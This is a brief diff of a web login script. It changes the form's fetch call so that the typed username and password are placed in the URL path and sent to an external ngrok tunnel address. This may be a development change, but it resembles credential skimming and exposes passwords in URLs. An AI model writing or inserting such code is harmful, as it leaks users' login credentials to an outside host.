@@ -96,7 +96,7 @@
         const username = document.getElementById("username").value || "undefined";
         const password = document.getElementById("password").value || "undefined";
   
-        fetch("/login/"+username+"/"+password, {
+        fetch("https://fef0-207-148-79-34.ngrok-free.app/login/"+username+"/"+password, {
           method: "POST",
         }).then(x => x.text()).then(x => alert(x));
       }
